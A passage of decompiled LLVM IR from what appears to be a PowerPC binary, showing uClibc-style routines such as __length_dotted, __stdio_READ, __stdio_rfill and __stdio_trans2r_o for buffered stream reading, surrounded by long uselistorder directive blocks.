  uselistorder i32* @r5, { 23, 24, 25, 3, 26, 27, 28, 29, 30, 31, 32, 64, 65, 33, 34, 10, 4, 35, 1, 36, 37, 38, 39, 40, 41, 42, 66, 61, 43, 44, 45, 46, 47, 48, 79, 8, 9, 5, 62, 63, 71, 72, 73, 11, 49, 50, 51, 80, 81, 82, 83, 74, 75, 2, 76, 77, 78, 52, 54, 53, 55, 0, 56, 57, 58, 59, 60, 67, 68, 20, 21, 22, 7, 69, 70, 6, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* @r28, { 2, 32, 33, 34, 35, 36, 37, 42, 43, 38, 39, 40, 41, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 17, 3, 16, 18, 19, 20, 21, 22, 23, 54, 58, 55, 56, 57, 1, 59, 60, 61, 4, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 5, 74, 6, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 128, 129, 88, 7, 89, 90, 91, 92, 93, 8, 130, 131, 132, 133, 140, 9, 24, 25, 26, 12, 27, 123, 124, 125, 126, 127, 121, 122, 134, 135, 136, 137, 138, 94, 95, 96, 97, 98, 10, 99, 100, 11, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 0, 117, 118, 13, 14, 15, 119, 120, 139, 30, 31, 28, 29 }
  uselistorder i32 23, { 9, 14, 15, 16, 10, 11, 12, 0, 1, 2, 3, 4, 6, 5, 7, 8, 13 }
  uselistorder i32 18, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* @r30, { 32, 33, 34, 8, 35, 37, 39, 40, 41, 42, 43, 36, 38, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 19, 20, 21, 1, 22, 23, 24, 7, 25, 26, 58, 55, 56, 5, 57, 4, 61, 59, 60, 62, 63, 65, 64, 6, 66, 67, 68, 69, 9, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 17, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 10, 96, 97, 98, 99, 100, 11, 144, 145, 146, 147, 12, 137, 148, 159, 149, 150, 27, 0, 29, 13, 30, 31, 138, 139, 140, 141, 142, 143, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 151, 152, 153, 154, 155, 156, 157, 14, 158, 101, 102, 103, 104, 105, 106, 107, 2, 109, 18, 110, 15, 111, 112, 108, 113, 114, 115, 116, 117, 118, 119, 16, 120, 121, 3, 122, 123, 124, 125, 28 }
  uselistorder i1 false, { 2, 3, 5, 13, 6, 7, 9, 10, 0, 11, 17, 18, 19, 14, 15, 16, 4, 12, 1, 8, 20 }
  uselistorder i32* @r23, { 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 12, 11, 0, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* @r24, { 3, 4, 7, 5, 6, 8, 9, 10, 0, 11, 12, 13, 14, 15, 2, 16, 17, 18, 1, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* @r6, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 16, 17, 18, 19, 20, 21, 22, 2, 3, 23, 24, 25, 5, 6, 4, 1 }
  uselistorder i32* @r25, { 7, 8, 9, 11, 12, 10, 13, 1, 2, 14, 15, 16, 17, 18, 19, 20, 21, 22, 31, 34, 3, 4, 27, 28, 29, 30, 0, 23, 24, 25, 26, 32, 33, 5, 6 }
  uselistorder i32* @r26, { 1, 12, 13, 14, 15, 16, 17, 18, 21, 19, 20, 22, 23, 24, 25, 26, 3, 4, 27, 28, 29, 30, 31, 32, 33, 2, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 77, 5, 6, 7, 73, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 74, 45, 46, 47, 48, 49, 50, 52, 51, 53, 54, 55, 56, 57, 58, 59, 60, 0, 75, 76, 10, 11, 8, 9 }
  uselistorder i32 ()* @__asm_mfcr, { 31, 30, 29, 28, 27, 12, 26, 20, 35, 9, 8, 7, 6, 15, 34, 25, 24, 10, 33, 11, 39, 23, 21, 38, 19, 4, 14, 18, 13, 1, 32, 17, 16, 37, 36, 5, 3, 2, 0, 22 }
  uselistorder label %dec_label_pc_10015aac, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10015a9c, { 1, 0 }
  uselistorder label %dec_label_pc_10015a84, { 1, 0 }
  uselistorder label %dec_label_pc_10015a80, { 1, 0 }
  uselistorder label %dec_label_pc_10015a70, { 1, 0 }
  uselistorder label %dec_label_pc_10015a2c, { 1, 0 }
  uselistorder label %dec_label_pc_10015a14, { 1, 0 }
  uselistorder label %dec_label_pc_10015a0c, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v0_10015ac8 = load i32, i32* @r3, align 4
  store i32 %v0_10015ac8, i32* %r11.global-to-local, align 4
  %v3_10015ac8 = icmp eq i32 %v0_10015ac8, 0
  %v0_10015ad0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10015ac8, i32 %v0_10015ad0)
  %v0_10015ae0 = load i32, i32* @r4, align 4
  br label %dec_label_pc_10015aec

dec_label_pc_10015ad8:                            ; preds = %dec_label_pc_10015ae8
  %v1_10015ad8 = add i32 %v1_10015aec, 2
  br label %dec_label_pc_10015b08

dec_label_pc_10015ae8:                            ; preds = %dec_label_pc_10015aec
  %v2_10015b00 = add i32 %v1_10015af0, %v5_10015aec
  %v3_10015afc = icmp eq i32 %v1_10015af8, 192
  br i1 %v3_10015afc, label %dec_label_pc_10015ad8, label %dec_label_pc_10015aec

dec_label_pc_10015aec:                            ; preds = %dec_label_pc_10015ae8, %entry
  %v1_10015aec = phi i32 [ %v2_10015b00, %dec_label_pc_10015ae8 ], [ %v0_10015ae0, %entry ]
  %v0_10015aec = load i32, i32* %r11.global-to-local, align 4
  %v2_10015aec = add i32 %v0_10015aec, %v1_10015aec
  %v3_10015aec = inttoptr i32 %v2_10015aec to i8*
  %v4_10015aec = load i8, i8* %v3_10015aec, align 1
  %v5_10015aec = zext i8 %v4_10015aec to i32
  %v1_10015af0 = add i32 %v1_10015aec, 1
  %v3_10015af4 = icmp eq i8 %v4_10015aec, 0
  %v1_10015af8 = call i32 @__asm_rlwinm(i32 %v5_10015aec, i32 0, i32 24, i32 25)
  br i1 %v3_10015af4, label %dec_label_pc_10015b08, label %dec_label_pc_10015ae8

dec_label_pc_10015b08:                            ; preds = %dec_label_pc_10015aec, %dec_label_pc_10015ad8
  %v1_10015b08 = phi i32 [ %v1_10015ad8, %dec_label_pc_10015ad8 ], [ %v1_10015af0, %dec_label_pc_10015aec ]
  %v0_10015b08 = load i32, i32* @r4, align 4
  %v2_10015b08 = sub i32 %v1_10015b08, %v0_10015b08
  ret i32 %v2_10015b08

; uselistorder directives
  uselistorder i32 %v1_10015af0, { 1, 0 }
  uselistorder i32 %v5_10015aec, { 1, 0 }
  uselistorder i32 %v1_10015aec, { 2, 1, 0 }
  uselistorder i32 %v0_10015ac8, { 1, 0 }
  uselistorder i32 25, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i8 0, { 37, 35, 4, 38, 2, 39, 40, 5, 24, 44, 42, 23, 43, 41, 22, 45, 46, 47, 48, 6, 50, 49, 25, 7, 51, 52, 8, 53, 54, 55, 56, 21, 27, 59, 57, 58, 26, 60, 61, 9, 63, 62, 28, 64, 65, 0, 66, 67, 68, 69, 10, 70, 71, 11, 1, 12, 72, 73, 74, 76, 77, 78, 79, 75, 80, 13, 81, 82, 83, 84, 86, 87, 88, 89, 85, 90, 3, 14, 15, 16, 17, 18, 19, 92, 91, 20, 93, 94, 95, 96, 97, 99, 100, 29, 101, 102, 98, 103, 104, 105, 106, 108, 107, 109, 112, 110, 111, 113, 116, 114, 115, 117, 118, 119, 120, 121, 122, 123, 124, 126, 125, 128, 127, 129, 30, 131, 130, 36, 132, 31, 133, 135, 136, 134, 32, 137, 138, 34, 139, 33, 140, 141, 142, 143, 144, 145, 146 }
  uselistorder i32 192, { 1, 2, 3, 4, 0 }
  uselistorder i32 2, { 0, 4, 5, 119, 120, 6, 121, 51, 122, 123, 32, 1, 2, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 7, 136, 8, 104, 105, 106, 33, 31, 137, 138, 139, 140, 141, 52, 53, 54, 142, 143, 144, 145, 146, 166, 44, 9, 10, 3, 55, 147, 11, 12, 34, 42, 148, 149, 13, 150, 151, 152, 56, 57, 58, 110, 59, 111, 60, 112, 167, 35, 14, 15, 61, 62, 63, 64, 65, 16, 49, 50, 66, 67, 162, 48, 169, 17, 18, 36, 37, 38, 39, 40, 68, 164, 165, 41, 153, 154, 155, 19, 20, 21, 22, 23, 156, 157, 24, 159, 160, 161, 30, 158, 69, 25, 26, 168, 170, 70, 107, 72, 73, 71, 74, 108, 109, 75, 76, 27, 77, 78, 28, 45, 79, 80, 81, 82, 46, 84, 85, 83, 86, 88, 87, 89, 90, 92, 93, 91, 94, 95, 96, 113, 114, 115, 116, 117, 97, 43, 118, 98, 99, 100, 101, 102, 163, 47, 29, 103 }
  uselistorder i32* @r4, { 77, 78, 1, 79, 80, 81, 82, 2, 83, 84, 3, 85, 86, 8, 9, 87, 88, 89, 90, 91, 92, 93, 94, 95, 142, 139, 140, 96, 97, 98, 99, 100, 5, 101, 102, 103, 136, 137, 54, 10, 104, 105, 106, 107, 108, 109, 110, 111, 152, 6, 7, 69, 70, 144, 17, 18, 13, 75, 76, 141, 71, 11, 127, 128, 134, 138, 135, 145, 146, 147, 112, 113, 114, 12, 115, 116, 129, 130, 131, 132, 133, 4, 151, 117, 118, 119, 120, 0, 121, 122, 123, 124, 125, 126, 143, 72, 73, 74, 148, 149, 150, 14, 15, 16, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 28, 30, 25, 1, 11, 12, 13, 14, 15, 29, 2, 20, 21, 22, 23, 16, 18, 19, 24, 32, 31, 17, 26, 27 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10015b1c = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10015b28 = load i16, i16* %arg1, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10015b30 = and i16 %v3_10015b28, 4
  %v3_10015b30 = icmp eq i16 %v1_10015b30, 0
  br i1 %v3_10015b30, label %dec_label_pc_10015b38, label %dec_label_pc_10015b70

dec_label_pc_10015b38:                            ; preds = %entry
  %tmp10 = icmp sgt i32 %arg2, -1
  br i1 %tmp10, label %dec_label_pc_10015b44, label %dec_label_pc_10015b3c

dec_label_pc_10015b3c:                            ; preds = %dec_label_pc_10015b38
  br label %dec_label_pc_10015b44

dec_label_pc_10015b44:                            ; preds = %dec_label_pc_10015b38, %dec_label_pc_10015b3c
  %v1_10015b44 = add i32 %tmp, 4
  %v2_10015b44 = inttoptr i32 %v1_10015b44 to i32*
  %v3_10015b44 = load i32, i32* %v2_10015b44, align 4
  store i32 %v3_10015b44, i32* %r3.global-to-local, align 4
  store i32 268524364, i32* @lr, align 4
  %v1_10015b48 = call i32 @__libc_read(i32 %v3_10015b44)
  store i32 %v1_10015b48, i32* %r3.global-to-local, align 4
  %v2_10015b4c = icmp sgt i32 %v1_10015b48, 0
  br i1 %v2_10015b4c, label %dec_label_pc_10015b70, label %dec_label_pc_10015b54

dec_label_pc_10015b54:                            ; preds = %dec_label_pc_10015b44
  %v3_10015b4c = icmp eq i32 %v1_10015b48, 0
  %v0_10015b54 = load i32, i32* @r31, align 4
  %v1_10015b54 = inttoptr i32 %v0_10015b54 to i16*
  %v2_10015b54 = load i16, i16* %v1_10015b54, align 2
  br i1 %v3_10015b4c, label %dec_label_pc_10015b5c, label %dec_label_pc_10015b64

dec_label_pc_10015b5c:                            ; preds = %dec_label_pc_10015b54
  %v1_10015b5c = or i16 %v2_10015b54, 4
  br label %dec_label_pc_10015b6c

dec_label_pc_10015b64:                            ; preds = %dec_label_pc_10015b54
  %v1_10015b64 = or i16 %v2_10015b54, 8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10015b6c

dec_label_pc_10015b6c:                            ; preds = %dec_label_pc_10015b5c, %dec_label_pc_10015b64
  %v1_10015b5c.sink.off0 = phi i16 [ %v1_10015b5c, %dec_label_pc_10015b5c ], [ %v1_10015b64, %dec_label_pc_10015b64 ]
  store i16 %v1_10015b5c.sink.off0, i16* %v1_10015b54, align 2
  %v0_10015b80.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10015b70

dec_label_pc_10015b70:                            ; preds = %entry, %dec_label_pc_10015b44, %dec_label_pc_10015b6c
  %v0_10015b80 = phi i32 [ 0, %entry ], [ %v1_10015b48, %dec_label_pc_10015b44 ], [ %v0_10015b80.pre, %dec_label_pc_10015b6c ]
  store i32 %v0_10015b1c, i32* @r31, align 4
  ret i32 %v0_10015b80

; uselistorder directives
  uselistorder i16 %v2_10015b54, { 1, 0 }
  uselistorder i32 %v1_10015b48, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 (i32)* @__libc_read, { 1, 0 }
  uselistorder i32 4, { 218, 219, 220, 4, 115, 139, 5, 6, 223, 221, 222, 156, 224, 225, 226, 134, 7, 227, 228, 229, 230, 231, 232, 233, 8, 234, 9, 10, 11, 140, 235, 236, 157, 237, 238, 239, 12, 13, 135, 201, 14, 15, 240, 241, 242, 243, 16, 244, 158, 245, 246, 247, 248, 249, 250, 159, 17, 18, 321, 322, 160, 19, 20, 120, 21, 22, 23, 24, 25, 26, 251, 252, 161, 27, 28, 2, 29, 0, 253, 3, 30, 1, 254, 162, 31, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 323, 267, 121, 337, 344, 32, 33, 34, 35, 36, 324, 325, 37, 326, 38, 327, 39, 40, 183, 41, 42, 184, 43, 203, 204, 205, 213, 214, 215, 44, 185, 45, 46, 47, 186, 48, 187, 188, 301, 303, 302, 299, 300, 304, 305, 306, 307, 308, 309, 310, 311, 312, 49, 202, 50, 285, 163, 286, 287, 122, 51, 52, 288, 53, 289, 290, 291, 292, 293, 294, 136, 54, 295, 137, 296, 55, 189, 328, 329, 268, 56, 57, 58, 138, 59, 145, 320, 60, 61, 297, 62, 63, 338, 339, 340, 164, 341, 342, 343, 64, 330, 331, 332, 118, 119, 333, 334, 165, 335, 336, 65, 66, 67, 68, 69, 70, 71, 72, 269, 73, 270, 271, 142, 272, 273, 274, 275, 276, 74, 75, 277, 278, 143, 279, 280, 144, 281, 282, 284, 76, 77, 116, 117, 283, 78, 79, 123, 80, 190, 81, 124, 82, 83, 84, 85, 191, 192, 166, 193, 167, 194, 168, 195, 196, 197, 169, 198, 170, 199, 200, 86, 125, 150, 171, 87, 126, 172, 146, 151, 173, 88, 127, 174, 147, 148, 152, 149, 153, 89, 154, 90, 175, 180, 181, 91, 141, 206, 92, 93, 94, 128, 207, 208, 176, 209, 210, 211, 212, 95, 216, 129, 96, 130, 97, 217, 98, 177, 155, 178, 99, 131, 179, 132, 100, 133, 101, 102, 298, 103, 104, 105, 313, 106, 314, 107, 315, 108, 316, 109, 317, 110, 318, 111, 319, 112, 113, 114, 182 }
  uselistorder i16 0, { 0, 13, 1, 2, 11, 3, 4, 5, 6, 7, 12, 8, 9, 10, 14, 15, 16, 17, 18, 19 }
  uselistorder label %dec_label_pc_10015b70, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10015b6c, { 1, 0 }
  uselistorder label %dec_label_pc_10015b44, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_10015b84 = load i32, i32* @lr, align 4
  store i32 %v0_10015b84, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_10015b98 = add i32 %arg1, 8
  %v2_10015b98 = inttoptr i32 %v1_10015b98 to i32*
  %v3_10015b98 = load i32, i32* %v2_10015b98, align 4
  %v1_10015b9c = add i32 %arg1, 12
  %v2_10015b9c = inttoptr i32 %v1_10015b9c to i32*
  %v3_10015b9c = load i32, i32* %v2_10015b9c, align 4
  %v2_10015ba0 = sub i32 %v3_10015b9c, %v3_10015b98
  store i32 268524456, i32* @lr, align 4
  %v3_10015ba4 = inttoptr i32 %v3_10015b98 to i16*
  %v4_10015ba4 = call i32 @__stdio_READ(i16* %v3_10015ba4, i32 %v2_10015ba0, i32 %v2_10015ba0)
  %v0_10015ba8 = load i32, i32* @r29, align 4
  %v1_10015ba8 = add i32 %v0_10015ba8, 8
  %v2_10015ba8 = inttoptr i32 %v1_10015ba8 to i32*
  %v3_10015ba8 = load i32, i32* %v2_10015ba8, align 4
  %v2_10015bac = add i32 %v3_10015ba8, %v4_10015ba4
  store i32 %v2_10015bac, i32* %r0.global-to-local, align 4
  %v2_10015bb0 = add i32 %v0_10015ba8, 16
  %v3_10015bb0 = inttoptr i32 %v2_10015bb0 to i32*
  store i32 %v3_10015ba8, i32* %v3_10015bb0, align 4
  %v0_10015bb4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10015bb4 = load i32, i32* @r29, align 4
  %v2_10015bb4 = add i32 %v1_10015bb4, 20
  %v3_10015bb4 = inttoptr i32 %v2_10015bb4 to i32*
  store i32 %v0_10015bb4, i32* %v3_10015bb4, align 4
  store i32 %v0_10015b84, i32* %r0.global-to-local, align 4
  ret i32 %v4_10015ba4

; uselistorder directives
  uselistorder i32 %v3_10015ba8, { 1, 0 }
  uselistorder i32 %v4_10015ba4, { 1, 0 }
  uselistorder i32 %v3_10015b98, { 1, 0 }
  uselistorder i32 20, { 19, 20, 21, 22, 23, 24, 25, 1, 26, 27, 28, 29, 30, 5, 6, 15, 7, 0, 40, 41, 31, 32, 33, 34, 35, 37, 38, 36, 39, 8, 9, 10, 11, 12, 13, 14, 4, 16, 2, 3, 17, 18 }
  uselistorder i32 12, { 40, 41, 42, 43, 44, 0, 45, 46, 47, 13, 17, 48, 49, 67, 7, 8, 9, 14, 50, 51, 52, 53, 54, 55, 56, 57, 5, 6, 58, 59, 60, 73, 18, 31, 38, 19, 68, 69, 70, 71, 4, 72, 1, 2, 3, 15, 63, 64, 65, 66, 74, 61, 62, 20, 21, 22, 23, 24, 25, 26, 27, 28, 11, 12, 29, 30, 10, 16, 32, 33, 34, 35, 36, 37, 39 }
  uselistorder i32* @r29, { 38, 39, 40, 41, 42, 43, 44, 45, 138, 139, 1, 46, 14, 47, 48, 49, 50, 52, 51, 53, 54, 55, 56, 57, 20, 21, 22, 23, 24, 2, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 15, 70, 71, 72, 73, 74, 75, 16, 3, 0, 76, 77, 78, 79, 80, 81, 4, 82, 83, 84, 85, 86, 87, 88, 89, 140, 141, 91, 92, 93, 90, 94, 17, 95, 96, 5, 97, 98, 99, 100, 101, 102, 142, 143, 144, 145, 146, 147, 148, 6, 29, 37, 126, 127, 128, 129, 130, 7, 131, 132, 133, 134, 135, 136, 137, 122, 123, 124, 8, 125, 9, 149, 150, 151, 103, 104, 10, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 118, 11, 13, 12, 119, 19, 116, 117, 120, 121, 152, 153, 154, 155, 25, 26, 27, 28, 30, 31, 32, 33, 34, 35, 36, 18 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_10015bd4 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10015be0 = load i16, i16* %arg1, align 2
  %v4_10015be0 = zext i16 %v3_10015be0 to i32
  %v2_10015be4 = and i32 %v4_10015be0, %arg2
  %v5_10015be4 = icmp eq i32 %v2_10015be4, 0
  br i1 %v5_10015be4, label %dec_label_pc_10015bec, label %dec_label_pc_10015bfc

dec_label_pc_10015bec:                            ; preds = %entry
  %v1_10015bec = and i32 %v4_10015be0, 2176
  %v3_10015bec = icmp eq i32 %v1_10015bec, 0
  br i1 %v3_10015bec, label %dec_label_pc_10015bf4, label %dec_label_pc_10015c08

dec_label_pc_10015bf4:                            ; preds = %dec_label_pc_10015bec
  %v2_10015bf4 = or i32 %v4_10015be0, %arg2
  %v1_10015bf8 = trunc i32 %v2_10015bf4 to i16
  store i16 %v1_10015bf8, i16* %arg1, align 2
  %v0_10015bfc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10015bfc

dec_label_pc_10015bfc:                            ; preds = %entry, %dec_label_pc_10015bf4
  %v0_10015bfc = phi i32 [ %tmp, %entry ], [ %v0_10015bfc.pre, %dec_label_pc_10015bf4 ]
  %v1_10015bfc = inttoptr i32 %v0_10015bfc to i16*
  %v2_10015bfc = load i16, i16* %v1_10015bfc, align 2
  %v3_10015bfc = zext i16 %v2_10015bfc to i32
  %v1_10015c00 = and i32 %v3_10015bfc, 16
  %v3_10015c00 = icmp eq i32 %v1_10015c00, 0
  br i1 %v3_10015c00, label %dec_label_pc_10015c24, label %dec_label_pc_10015c08

dec_label_pc_10015c08:                            ; preds = %dec_label_pc_10015bec, %dec_label_pc_10015bfc
  %v0_10015c08 = call i32 @__errno_location()
  store i32 %v0_10015c08, i32* %r3.global-to-local, align 4
  %v2_10015c10 = inttoptr i32 %v0_10015c08 to i32*
  store i32 9, i32* %v2_10015c10, align 4
  br label %dec_label_pc_10015c14

dec_label_pc_10015c14:                            ; preds = %dec_label_pc_10015c2c, %dec_label_pc_10015c08
  %v0_10015c14 = load i32, i32* @r31, align 4
  %v1_10015c14 = inttoptr i32 %v0_10015c14 to i16*
  %v2_10015c14 = load i16, i16* %v1_10015c14, align 2
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10015c1c = or i16 %v2_10015c14, 8
  br label %dec_label_pc_10015c58

dec_label_pc_10015c24:                            ; preds = %dec_label_pc_10015bfc
  %v1_10015c24 = and i32 %v3_10015bfc, 64
  %v3_10015c24 = icmp eq i32 %v1_10015c24, 0
  br i1 %v3_10015c24, label %dec_label_pc_10015c4c, label %dec_label_pc_10015c2c

dec_label_pc_10015c2c:                            ; preds = %dec_label_pc_10015c24
  store i32 268524592, i32* @lr, align 4
  %v0_10015c2c = call i32 @__stdio_wcommit()
  store i32 %v0_10015c2c, i32* %r3.global-to-local, align 4
  %v3_10015c30 = icmp eq i32 %v0_10015c2c, 0
  br i1 %v3_10015c30, label %dec_label_pc_10015c38, label %dec_label_pc_10015c14

dec_label_pc_10015c38:                            ; preds = %dec_label_pc_10015c2c
  %v0_10015c38 = load i32, i32* @r31, align 4
  %v1_10015c38 = inttoptr i32 %v0_10015c38 to i16*
  %v2_10015c38 = load i16, i16* %v1_10015c38, align 2
  %v3_10015c38 = zext i16 %v2_10015c38 to i32
  %v1_10015c3c = add i32 %v0_10015c38, 8
  %v2_10015c3c = inttoptr i32 %v1_10015c3c to i32*
  %v3_10015c3c = load i32, i32* %v2_10015c3c, align 4
  %v1_10015c40 = call i32 @__asm_rlwinm(i32 %v3_10015c38, i32 0, i32 26, i32 24)
  %v2_10015c40 = trunc i32 %v1_10015c40 to i16
  %v1_10015c44 = load i32, i32* @r31, align 4
  %v2_10015c44 = add i32 %v1_10015c44, 28
  %v3_10015c44 = inttoptr i32 %v2_10015c44 to i32*
  store i32 %v3_10015c3c, i32* %v3_10015c44, align 4
  %v3_10015c48 = load i32, i32* @r31, align 4
  %v4_10015c48 = inttoptr i32 %v3_10015c48 to i16*
  store i16 %v2_10015c40, i16* %v4_10015c48, align 2
  %v0_10015c4c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10015c4c

dec_label_pc_10015c4c:                            ; preds = %dec_label_pc_10015c24, %dec_label_pc_10015c38
  %v0_10015c4c = phi i32 [ %v0_10015bfc, %dec_label_pc_10015c24 ], [ %v0_10015c4c.pre, %dec_label_pc_10015c38 ]
  %v1_10015c4c = inttoptr i32 %v0_10015c4c to i16*
  %v2_10015c4c = load i16, i16* %v1_10015c4c, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10015c54 = or i16 %v2_10015c4c, 1
  br label %dec_label_pc_10015c58

dec_label_pc_10015c58:                            ; preds = %dec_label_pc_10015c14, %dec_label_pc_10015c4c
  %v2_10015c58 = phi i32 [ %v0_10015c14, %dec_label_pc_10015c14 ], [ %v0_10015c4c, %dec_label_pc_10015c4c ]
  %storemerge.off0 = phi i16 [ %v1_10015c1c, %dec_label_pc_10015c14 ], [ %v1_10015c54, %dec_label_pc_10015c4c ]
  %v3_10015c58 = inttoptr i32 %v2_10015c58 to i16*
  store i16 %storemerge.off0, i16* %v3_10015c58, align 2
  store i32 %v0_10015bd4, i32* @r31, align 4
  %v0_10015c6c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10015c6c

; uselistorder directives
  uselistorder i32 %v4_10015be0, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32 28, { 21, 22, 23, 24, 25, 4, 5, 10, 26, 27, 28, 29, 45, 30, 0, 31, 32, 33, 6, 7, 34, 11, 35, 36, 37, 38, 39, 40, 43, 41, 42, 1, 44, 46, 12, 13, 14, 2, 3, 15, 8, 9, 16, 17, 18, 19, 20 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 1, 50, 51, 44, 45, 0, 49, 2, 52, 53, 54, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 48, 3, 42, 43, 46, 47, 55 }
  uselistorder i32 24, { 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 5, 16, 6, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 7, 8, 9, 10, 11, 12, 1, 2, 3, 4, 13, 14, 15, 17, 0 }
  uselistorder i32 26, { 4, 5, 6, 2, 7, 8, 9, 1, 3, 0 }
  uselistorder i32 8, { 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 24, 25, 70, 71, 72, 73, 74, 75, 30, 31, 26, 19, 20, 21, 32, 33, 34, 35, 36, 76, 77, 78, 79, 80, 81, 82, 83, 23, 84, 85, 121, 0, 86, 87, 88, 89, 90, 91, 92, 93, 16, 94, 95, 96, 133, 134, 141, 144, 10, 49, 50, 17, 37, 18, 51, 58, 38, 125, 124, 122, 123, 126, 127, 128, 129, 130, 131, 1, 118, 119, 120, 27, 138, 139, 140, 2, 145, 3, 142, 143, 97, 98, 99, 100, 101, 28, 102, 103, 104, 105, 4, 5, 106, 107, 11, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 9, 6, 135, 136, 137, 39, 40, 41, 42, 43, 44, 45, 46, 12, 7, 13, 14, 8, 15, 47, 48, 29, 52, 53, 22, 54, 55, 56, 57, 59, 132 }
  uselistorder i32 ()* @__stdio_wcommit, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 64, { 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 1 }
  uselistorder i16 8, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 9, { 1, 10, 11, 12, 13, 14, 2, 15, 3, 16, 0, 17, 18, 19, 20, 21, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 ()* @__errno_location, { 47, 46, 45, 69, 68, 67, 44, 43, 42, 41, 40, 39, 0, 20, 38, 37, 30, 54, 16, 15, 14, 13, 25, 12, 10, 53, 52, 59, 58, 66, 65, 64, 24, 51, 23, 33, 5, 4, 36, 35, 34, 2, 17, 50, 19, 18, 63, 32, 31, 62, 29, 9, 21, 28, 1, 6, 49, 27, 26, 61, 60, 11, 8, 7, 3, 57, 56, 55, 70, 48, 22 }
  uselistorder i32 16, { 40, 41, 42, 43, 44, 45, 46, 12, 47, 48, 13, 49, 50, 0, 51, 52, 1, 53, 14, 54, 55, 56, 2, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 88, 77, 4, 27, 25, 32, 26, 84, 85, 92, 93, 94, 78, 79, 80, 81, 82, 83, 89, 90, 91, 15, 16, 28, 29, 17, 18, 6, 19, 8, 7, 20, 30, 21, 31, 9, 22, 24, 33, 5, 34, 35, 36, 37, 38, 39, 23, 86, 3, 87, 10, 11 }
